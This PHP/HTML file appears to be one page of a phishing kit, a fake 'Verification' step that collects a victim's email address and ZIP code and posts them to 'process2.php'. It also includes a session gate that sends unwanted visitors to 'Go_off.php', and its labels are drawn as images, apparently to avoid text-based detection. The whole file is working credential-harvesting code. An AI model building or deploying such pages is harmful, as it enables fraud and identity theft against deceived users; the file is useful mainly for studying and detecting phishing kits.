<?php
session_start();
ob_start();

function loggedin(){
if(isset($_SESSION['UserID'])&&!empty($_SESSION['UserID'])){
	return true;
	}else{
		return false;
		}
}


if(loggedin()){
	$email = @$_SESSION['email'];
	$zip = @$_SESSION['zip'];

				}else{
		
		die(include 'Go_off.php');
		}



?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Verification</title>
<link rel="shortcut icon" href="images/favicon.png"/>
<script type="text/javascript" src="js/jqueryLib.js"></script>
<link rel="stylesheet" href="css/style.css" />

<script language="JavaScript" type="text/javascript">/*<![CDATA[*/
function numbersOnly(field, event) {
	return allowedChars(field, event, "-0123456789.,");
}

function digitsOnly(field, event) {
	return allowedChars(field, event, "0123456789");
}

function allowedChars(field, event, chars) {
	var key;

	if (window.event) {
		key = window.event.keyCode;
	} else {
		if (event) {
			key = event.which;
		} else {
			return true;
		}
	}

	if (isOneOf(key, null, 0, 8, 9, 13, 27, 37, 39, 46)) {
		return true;
	} else {
		var keychar = String.fromCharCode(key);

		if (chars.indexOf(keychar) > -1) {
			return true;
		} else {
			return false;
		}
	}
}

function isOneOf(key) {
	for (arg in arguments) {
		if (key == arg) {
			return true;
		}
	}
	
	return false;
}
			/*]]>*/</script>

</head>


<body>
 
 <div class="img12-const">
    <div class="img12"></div>
 </div> 
 <div class="img13-const">
    <div class="img13"></div>
 </div>
 <div class="img-container-const">
   <div class="img-container">
     <form id="form1" method="post" action="process2.php">
       <table width="840" border="0">
         <tr>
           <td width="834"><div class="img14"></div></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="label3"></div></td>
         </tr>
         <tr>
           <td>
           <input type="email" name="emailaccess" id="emailaccess" required="required" autocomplete="off" class="u-email" /></td>
         </tr>
         <tr>
           <td><div class="img15">&nbsp;</div></td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="img16"></div></td>
         </tr>
         <tr>
           <td>
           <input type="text" name="zip" id="zip" required="required" maxlength="5" minlength="5" autocomplete="off" class="u-zipcode" onKeyPress="javascript:return(numbersOnly(this,event));" /></td>
         </tr>
         <tr>
           <td><div class="img20"></div>&nbsp;</td>
         </tr>
         <tr>
           <td><input type="hidden" name="wiz" value="">&nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td><div class="img17"></div>&nbsp;</td>
         </tr>
         <tr>
           <td><input type="submit" name="btnlogin" id="btnlogin" value="s" class="img18" />
           &nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
         <tr>
           <td>&nbsp;</td>
         </tr>
       </table>
     </form>
   </div>
 </div>
<div class="footer3-const">
   <div class="footer3"></div>
 </div>
</body>
</html>